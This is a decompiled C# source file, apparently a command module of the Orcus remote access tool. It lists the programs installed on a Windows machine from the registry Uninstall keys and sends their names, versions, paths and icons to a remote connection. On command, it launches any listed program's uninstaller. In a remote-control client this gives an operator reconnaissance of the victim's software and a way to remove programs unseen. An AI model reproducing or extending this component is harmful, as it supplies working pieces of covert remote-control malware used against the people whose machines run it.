using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Shared.Commands.UninstallPrograms;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.UninstallPrograms;

internal class UninstallProgramsCommand : Command
{
	private readonly Dictionary<int, string> _uninstallPaths = new Dictionary<int, string>();

	private int _counter;

	private IEnumerable<UninstallableProgram> GetEntries(RegistryKey registryKey, UninstallProgramEntryLocation location)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		string[] subKeyNames = registryKey.GetSubKeyNames();
		foreach (string name in subKeyNames)
		{
			using RegistryKey subKey = registryKey.OpenSubKey(name);
			string text = subKey?.GetValue("DisplayName") as string;
			string value = subKey?.GetValue("UninstallString") as string;
			if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(value))
			{
				int num = _counter++;
				_uninstallPaths.Add(num, value);
				UninstallableProgram val = new UninstallableProgram();
				val.set_Id(num);
				val.set_Name(text);
				val.set_Version(subKey.GetValue("DisplayVersion") as string);
				val.set_EntryLocation(location);
				val.set_Location(subKey.GetValue("InstallLocation") as string);
				val.set_Size((int)subKey.GetValue("EstimatedSize", 0));
				val.set_IconData(GetIconFromPath(subKey.GetValue("DisplayIcon") as string));
				yield return val;
			}
		}
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Invalid comparison between Unknown and I4
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got Unknown
		UninstallProgramsCommunication val = (UninstallProgramsCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 2)
			{
				throw new ArgumentOutOfRangeException();
			}
			int key = BitConverter.ToInt32(parameter, 1);
			if (!_uninstallPaths.ContainsKey(key))
			{
				((Command)this).ResponseByte((byte)5, connectionInfo);
				return;
			}
			try
			{
				Process.Start(_uninstallPaths[key]);
			}
			catch (Exception ex)
			{
				((Command)this).ResponseBytes((byte)4, Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
			}
			((Command)this).ResponseByte((byte)3, connectionInfo);
			return;
		}
		_uninstallPaths.Clear();
		List<UninstallableProgram> list = new List<UninstallableProgram>();
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		if (registryKey != null)
		{
			using (registryKey)
			{
				list.AddRange(GetEntries(registryKey, (UninstallProgramEntryLocation)0));
			}
		}
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		if (registryKey3 != null)
		{
			using (registryKey3)
			{
				list.AddRange(GetEntries(registryKey3, (UninstallProgramEntryLocation)1));
			}
		}
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		if (registryKey4 != null)
		{
			using (registryKey4)
			{
				list.AddRange(GetEntries(registryKey4, (UninstallProgramEntryLocation)2));
			}
		}
		List<UninstallableProgram> list2 = new List<UninstallableProgram>();
		foreach (UninstallableProgram uninstallableProgram in list)
		{
			if (!list2.Any((UninstallableProgram x) => x.get_Location() == uninstallableProgram.get_Location() && x.get_Name() == uninstallableProgram.get_Name() && x.get_Version() == uninstallableProgram.get_Version()))
			{
				list2.Add(uninstallableProgram);
			}
		}
		Serializer val2 = new Serializer(typeof(List<UninstallableProgram>));
		((Command)this).ResponseBytes((byte)1, val2.Serialize((object)list2), connectionInfo);
	}

	private byte[] GetIconFromPath(string filename)
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		if (!filename.IsNullOrWhiteSpace() && !filename.Trim(new char[1] { '"' }).IsNullOrWhiteSpace())
		{
			Icon val = null;
			try
			{
				FileInfo fileInfo = new FileInfo(filename.Trim(new char[1] { '"' }));
				val = (Icon)(string.Equals(fileInfo.Extension, ".ico", StringComparison.OrdinalIgnoreCase) ? ((object)new Icon(fileInfo.FullName)) : ((object)Icon.ExtractAssociatedIcon(fileInfo.FullName)));
			}
			catch (Exception)
			{
			}
			if (val == null)
			{
				return null;
			}
			Bitmap val2 = ((Image)(object)val.ToBitmap()).ResizeImage(20, 20);
			using MemoryStream memoryStream = new MemoryStream();
			((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Png());
			return memoryStream.ToArray();
		}
		return null;
	}

	protected override uint GetId()
	{
		return 17u;
	}
}
